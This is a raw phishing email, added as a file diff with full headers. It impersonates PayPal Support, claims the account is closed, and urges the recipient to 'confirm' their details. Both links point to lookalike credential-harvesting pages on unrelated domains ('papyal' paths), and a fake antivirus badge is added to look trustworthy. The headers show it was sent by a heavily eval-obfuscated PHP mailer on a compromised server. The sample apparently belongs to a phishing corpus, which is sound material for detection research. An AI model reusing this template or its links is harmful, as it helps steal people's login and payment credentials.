@@ -1,0 +1,105 @@
+Return-Path: <artdivision@artdivision.cz>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 1B167F4166
+	for <jose@login.monkey.org>; Mon, 28 Sep 2015 04:18:09 -0500 (CDT)
+Received: from smtpin07.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay02.b.hostedemail.com (Postfix) with SMTP id C164B27AB7F
+	for <jose@login.monkey.org>; Mon, 28 Sep 2015 09:18:08 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70682101056.07.vein68_813e092826933
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 40,2.5,0,792e57622b17b3e3,d41d8cd98f00b204,artdivision@artdivision.cz,:,RULES_HIT:2:41:72:196:355:375:379:967:973:983:988:989:1042:1212:1224:1260:1263:1313:1314:1345:1381:1390:1431:1432:1433:1434:1437:1516:1517:1535:1571:1622:1699:1730:1744:1747:1777:1792:1801:1803:2068:2069:2084:2198:2199:2376:2393:2525:2527:2568:2610:2627:2682:2685:2693:2859:2890:2892:2894:2909:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3148:3352:3586:3865:3866:3867:3868:3870:3871:3872:3873:3889:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4049:4118:4552:4605:5007:6261:6669:6678:7903:8515:8518:8599:8603:8957:9025:9121:9165:9344:9388:9416:9908:10009:10030:10049:10231:10346:11233:11473:11657:11658:11914:12043:12438:12555:12663:12740:12776:12891:12956:12958:12959:12960:12967:12968:13019:13139:13141:13230:14094:14096:14129:21080,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL:neutral,Custom_rules:0:1:0
+X-HE-Tag: vein68_813e092826933
+X-Filterd-Recvd-Size: 7288
+Received: from artdivision.cz (static.70.41.251.148.clients.your-server.de [148.251.41.70])
+	by imf03.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Mon, 28 Sep 2015 09:18:08 +0000 (UTC)
+Received: by artdivision.cz (Postfix, from userid 10000)
+	id 3712A647250; Tue, 29 Sep 2015 11:14:44 +0200 (CEST)
+To: jose@monkey.org
+Subject: Your account has been temporarily closed !
+X-PHP-Originating-Script: 10000:fouedmailerunlemeted.php(545) : eval()'d code(2) : eval()'d code(1) : eval()'d code(1) : eval()'d code(1) : eval()'d code(1) : eval()'d code(1) : eval()'d code(1) : eval()'d code(1) : eval()'d code
+From: Support <donoreply@intl.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Message-Id: <20150929091444.3712A647250@artdivision.cz>
+Date: Tue, 29 Sep 2015 11:14:44 +0200 (CEST)
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 187
+
+<div id=":ui" class="a3s" style="overflow: hidden;"><div style="overflow:hidden"><div style="overflow:hidden"><div style="color:rgb(80,0,80);font-family:arial,sans-serif;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:normal;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;font-size:13px;text-align:-webkit-left;width:405px;min-height:235px;background-color:rgb(255,255,255)"><div class="adM">
+        </div><div style="width:404px;min-height:81px"><div class="adM">
+                </div><p align="left"><b><i><font size="6" color="#000066">PayPal</font><font size="6" color="#0079C1">Support</font></i></b></p>
+                <h2 style="color:rgb(51,51,51);font-family:arial,sans-serif;font-style:normal;font-variant:normal;letter-spacing:normal;line-height:normal;text-align:start;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;background-color:rgb(255,255,255)" align="left">
+                <font size="3" color="#33CCCC" face="Candara">Confirm your informations
+                for our new system</font></h2>
+        </div>
+        <p style="color:rgb(51,51,51);font-family:arial,sans-serif;font-style:normal;font-variant:normal;letter-spacing:normal;line-height:normal;text-align:start;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;background-color:rgb(255,255,255)" align="left">
+         </p>
+        <p style="color:rgb(128,128,128);font-family:Tahoma;font-size:11px;font-style:normal;font-variant:normal;font-weight:700;letter-spacing:normal;line-height:normal;text-align:start;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;margin:11px 0px;padding:0px;background-color:rgb(255,255,255)" align="left">
+        We added a new system email address to your account, but you're not
+        finished yet. Please take a minute to confirm this email address is yours.</p>
+        <p style="color:rgb(128,128,128);font-family:Tahoma;font-size:11px;font-style:normal;font-variant:normal;font-weight:700;letter-spacing:normal;line-height:normal;text-align:start;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;margin:11px 0px;padding:0px;background-color:rgb(255,255,255)" align="left">
+        Once you confirm it, you can use this email address to receive payments from
+        friends and family. Plus, you can make it your primary address for all your
+         business.</p>
+        <p style="color:rgb(128,128,128);font-family:Tahoma;font-size:11px;font-style:normal;font-variant:normal;font-weight:700;letter-spacing:normal;line-height:normal;text-align:start;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;margin:11px 0px;padding:0px;background-color:rgb(255,255,255)" align="left">
+        <a style="color:rgb(51,204,204);text-decoration:underline" href="http://www.rultech.com/tmp/pp/ssl.security.papyal.verification1.reset22/loading.paypal.html" target="_blank">
+        Confirm My Email Address</a></p>
+       <p align="left"> </p></div>
+<div style="color:rgb(80,0,80);font-family:arial,sans-serif;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:normal;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;font-size:13px;text-align:-webkit-left;width:407px;min-height:100px;background-color:rgb(255,255,255)">
+        <table style="font-style:normal;font-variant:normal;font-weight:normal;font-size:11px;line-height:normal;font-family:Verdana,Arial,Helvetica,sans-serif" border="0" width="100%" cellpadding="10" cellspacing="0">
+                <tbody><tr>
+                        <td style="font-family:arial,sans-serif;margin:0px;background-color:rgb(232,241,250)">
+                        <h4 align="left">Here's another way to confirm your email address:</h4>
+                        <ol style="font-weight:bold;margin:0px">
+                                <li style="margin-right:15px;margin-left:15px">
+                                <p align="left"><span style="font-weight:normal">
+                                <a style="color:rgb(17,85,204);text-decoration:underline" href="http://goblin.ga/meler/pp/ssl.security.papyal.verification1.reset22/loading.paypal.html" target="_blank">
+                                Log in</a> to your account .</span></p></li>
+                                <li style="margin-right:15px;margin-left:15px">
+                                <p align="left"><span style="font-weight:normal">Enter the
+                                required </span>information<span style="font-weight:normal">.</span></p></li>
+                                <li style="margin-right:15px;margin-left:15px">
+                                <p align="left"><span style="font-weight:400">Then
+                                Congratulations You've successfully account<span lang="ar-ma">.</span></span></p></li>
+                                <li style="margin-right:15px;margin-left:15px">
+                                <p align="left"><span style="font-weight:400">You will be
+                                redirected to the main interface of the site<span lang="ar-ma">.</span></span></p></li>
+                        </ol>
+                        </td>
+                </tr>
+        </tbody></table><div></div><div>
+
+
+
+<br><br>
+<hr style="border:none;color:#909090;background-color:#b0b0b0;min-height:1px;width:99%">
+<table style="border-collapse:collapse;border:none">
+	<tbody><tr>
+		<td style="border:none;padding:0px 15px 0px 8px">
+			<a href="https://www.quickheal.com/" target="_blank">
+				<img border="0" src="https://ci5.googleusercontent.com/proxy/kkfhQZmqy1HzCbkR00_L0yQSDS4MJQr83iF3UqlissbJguyofZgZwR3c8KfMsDam4RSgtyTRoto19BiyEiQqYt2ai1k5aQEQ-pvoLnisGYb0MDgAH4Oa3fDA=s0-d-e1-ft#http://www.360ms.in/control_panel/clienteleImage/Quick-Heal-Logo.jpg" alt="Quickheal logo" class="CToWUd">
+			</a>
+		</td>
+		<td>
+			<p>
+				This email has been checked for viruses by Quickheal antivirus software.
+				<br><a href="https://www.quickheal.com/" target="_blank">https://www.quickheal.com/</a>
+			</p>
+		</td>
+	</tr>
+</tbody></table><div class="yj6qo"></div><div class="adL"></div><div class="adL"></div><div class="adL"></div><div class="adL">
+<br>
+</div></div></div><div class="adL"><br></div><div class="adL">
+</div><div class="adL">
+</div></div><div class="adL">
+</div></div><div class="adL">
+</div></div>
